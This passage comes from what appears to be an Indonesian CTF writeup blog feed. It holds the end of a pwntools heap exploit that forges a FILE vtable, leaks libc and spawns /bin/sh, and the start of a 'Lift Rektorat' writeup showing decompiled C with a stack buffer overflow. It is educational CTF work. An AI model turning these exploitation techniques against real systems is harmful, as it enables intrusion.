&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;===========&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[1] Create&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[2] Edit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[3] Delete&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[4] Print&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[5] Exit&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# Step 2: leak, overwrite File Pointer&lt;/span&gt;

PUTS_GOT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00601f80&lt;/span&gt;

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(int(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(PUTS_GOT)   &lt;span style=&#34;color:#75715e&#34;&gt;# reloc.puts&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(int(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x006020c0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fake _IO_jump_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(int(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x006021c0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# faile&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(int(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00602050&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# (void*) faile&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(int(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00602060&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;amp;_IO_jump_t&lt;/span&gt;
edit(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], payload)

libc_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _print(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
libc_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(libc_puts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))
libc_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6f690&lt;/span&gt;
system  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45390&lt;/span&gt;

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LIBC_LEAK &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(libc_puts))
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;LIBC_BASE &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(libc_base))
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SYSTEM    &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(system))

faile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _print(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
faile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(faile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;FAILE &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(faile))

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(int(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(faile)
edit(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;], payload)

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
edit(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;], payload)

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(int(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(faile &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xd8&lt;/span&gt;)
edit(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;], payload)

_io_jump_t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _print(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])
_io_jump_t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(_io_jump_t&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_IO_jump  &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex(_io_jump_t))

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x006020c0&lt;/span&gt;)
edit(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;], payload) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_jump_t -&amp;gt; fake _IO_jump_t&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# spray&lt;/span&gt;
payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# size_t_dummy&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# size_t_dummy2&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x401297&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_finish_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_overflow_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_underflow_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_underflow_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_pbackfail_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_xsputn_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_xsgetn_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_seekoff_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_seekpos_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_setbuf_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_sync_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_doallocate_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_read_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_write_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_seek_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_close_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_stat_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_showmanyc_t&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(system) &lt;span style=&#34;color:#75715e&#34;&gt;# _IO_imbue_t&lt;/span&gt;
edit(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], payload)

_exit()

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Referensi:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap&#34;&gt;https://github.com/shellphish/how2heap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/&#34;&gt;https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/&#34;&gt;https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
       </item>
       
       <item>
         <title>AgriHack 0x2 - Lift Rektorat Writeup</title>
         <link>http://kiror0.github.io/ctf/posts/agrihack-0x2-lift-rektorat-writeup/</link>
         <pubDate>Fri, 24 Nov 2017 00:38:01 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/agrihack-0x2-lift-rektorat-writeup/</guid>
         <description>&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Lift Rektorat (300 pts)&lt;/strong&gt;&lt;/em&gt; Kamu sedang berada direktorat karena kamu hendak menemui rektor karena kamu ditunjuk menjadi kepala keamanan cyber di IPB. Tiba-tiba terjadi sebuah insiden yang membuat kamu tersadar, bahwa bahkan lift rektorat memiliki celah untuk dieksploitasi. Tunjukkan bagaimana kamu mengeksploitasi celah tersebut. &amp;ndash; binary &amp;ndash;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Solusi:&lt;/strong&gt;&lt;/em&gt; Diberikan binary ELF 32-bit dengan NX bit enabled dan tanpa stack canary. Dapat di-_ramal-&lt;em&gt;kan sekiranya soal ini di_solve&lt;/em&gt; dengan return to libc karena stack sendiri tidak dapat dieksekusi.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;danger&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+Eh] [ebp-4Ah]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  strcpy(aSelamatDatangD, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|            Peringatan Bahaya Lift Berhenti Berfungsi                |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  strcpy(aSilahkanMasuka, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|              Silahkan Kirimkan Pesan Kepada Petugas                 |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  cetak(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--------------------||-------------||------------||------------------|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|____________________||-------------||------------||__________________|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Pesan : &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  fgets(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, stdin);
  strcpy(aSelamatDatangD, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                        Pesan Terkirim                               |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  strcpy(aSilahkanMasuka, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|            Silahkan Menunggu Sejenak dan Tetap Tenang               |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  cetak(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--------------------||-------------||------------||------------------|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
